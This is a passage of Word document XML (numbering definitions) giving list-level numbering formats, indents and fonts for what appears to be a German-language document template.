        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="140A753E"/>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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="143E4302"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="47C6DC7A"/>
    <w:lvl w:ilvl="0" w:tplc="DFA8B34E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="FormatvorlageAufzhlung1"/>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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="19D548F6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8C04EC6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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1ACE11A5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6D167AC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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1D8B0EAE"/>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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1E08511A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C610D0D2"/>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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1F971637"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="77AEC56C"/>
    <w:lvl w:ilvl="0" w:tplc="449A21E6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="717"/>
        </w:tabs>
        <w:ind w:left="717" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:color w:val="auto"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>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211E3DF1"/>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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="21365442"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="83E0C8AA"/>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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="25614361"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="412EE14E"/>
    <w:lvl w:ilvl="0" w:tplc="0C07000F">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="0C070019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="0C07001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="0C07000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="0C070019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="0C07001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="0C07000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="0C070019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="0C07001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="279B1FE1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="44247AA4"/>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15" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="28F20231"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2A8C83E6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2B260094"/>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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2D0717CC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B472E9D6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>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18" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2F992CFD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0407001D"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="360"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="(%4)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="(%5)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1800"/>
        </w:tabs>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="(%6)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2520"/>
        </w:tabs>
        <w:ind w:left="2520" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3240"/>
        </w:tabs>
        <w:ind w:left="3240" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="19" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="324374BC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="260AAEE6"/>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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35D453C3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9C7607C8"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="24"/>
        <w:szCs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1" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="36A75515"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3E3289A4"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Times New Roman" w:hint="default"/>
        <w:b/>
        <w:bCs w:val="0"/>
        <w:i w:val="0"/>
        <w:iCs w:val="0"/>
        <w:caps w:val="0"/>
        <w:smallCaps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:noProof w:val="0"/>
        <w:snapToGrid w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="000000"/>
        <w:spacing w:val="0"/>
        <w:w w:val="0"/>
        <w:kern w:val="0"/>
        <w:position w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>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ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="24"/>
        <w:szCs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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="37F023DE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B472E9D6"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="36"/>
        <w:szCs w:val="36"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="450F0650"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="253CB84A"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="227"/>
        </w:tabs>
        <w:ind w:left="227" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:caps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="auto"/>
        <w:position w:val="0"/>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576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="32"/>
        <w:szCs w:val="32"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="24"/>
        <w:szCs w:val="24"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b/>
        <w:i w:val="0"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5.%6"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1152"/>
        </w:tabs>
        <w:ind w:left="1152" w:hanging="1152"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>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24" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4DF45229"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="65C244B4"/>
    <w:lvl w:ilvl="0" w:tplc="62105DBA">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tplc="CF0A4622">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="–"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="680"/>
        </w:tabs>
        <w:ind w:left="737" w:hanging="283"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:caps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="auto"/>
        <w:w w:val="100"/>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2" w:tplc="3836D86E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1134"/>
        </w:tabs>
        <w:ind w:left="1134" w:hanging="227"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
        <w:b w:val="0"/>
        <w:i w:val="0"/>
        <w:caps w:val="0"/>
        <w:strike w:val="0"/>
        <w:dstrike w:val="0"/>
        <w:vanish w:val="0"/>
        <w:color w:val="auto"/>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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="51834B6F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1A882D70"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift1"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="432"/>
        </w:tabs>
        <w:ind w:left="432" w:hanging="432"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift2"/>
      <w:lvlText w:val="%1.%2"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="576"/>
        </w:tabs>
        <w:ind w:left="576" w:hanging="576"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift3"/>
      <w:lvlText w:val="%1.%2.%3"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4832"/>
        </w:tabs>
        <w:ind w:left="4832" w:hanging="720"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1.%2.%3.%4"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="864"/>
        </w:tabs>
        <w:ind w:left="864" w:hanging="864"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="berschrift5"/>
      <w:lvlText w:val="%1.%2.%3.%4.%5"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1008"/>
        </w:tabs>
        <w:ind w:left="1008" w:hanging="1008"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
